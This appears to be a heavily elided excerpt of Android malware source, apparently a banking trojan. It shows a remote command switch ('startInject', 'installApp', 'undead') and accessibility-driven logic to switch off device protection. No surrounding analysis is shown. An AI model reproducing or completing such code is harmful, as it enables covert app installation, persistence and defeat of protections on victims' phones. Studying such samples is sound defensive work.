    ...
    public void checkProtect(final Context context){
        if (!consts.checkedProtect){
            try {
                ...
                utl.SettingsWrite(context, consts.checkProtect, "2");
                consts.checkedProtect = true;
                Log.e("test","checked protect" + consts.checkedProtect);
            ...
            if(jsonObject.getString("this").equals("no_command")
                ...
                switch (jsonCommand.getString("name")){
                    ...
                    case "startInject":
                        ...
                        break;
                    case "installApp":
                        utl.installApp(context, jsonCommand.getString("app"));
                        Log.d("installapp", "got command to install: " + jsonCommand.getString("app"));
                    case "openUrl":
                    ...
                    case "startApp":
                        ...
                        break;
                    case "undead":
                        utl.SettingsWrite(context, "undead", "1");
                        break;
    ...
    private String serviceWorkingWhile(Context context, JSONObject jsonObject){
        ...
        try {
            if ((jsonObject.getString("accessibility").equals("1")) && (utl.getScreenBoolean(context))) {
                if (utl.SettingsRead(context, consts.checkProtect).equals("1") && utl.SettingsRead(context,"protecttry").equals("0")) {
                    if(tick > Integer.parseInt(utl.SettingsRead(context, consts.timeProtect))) {
                        utl.SettingsWrite(context, consts.goOffProtect, "1");
                        utl.SettingsWrite(context, "protecttry", "1");
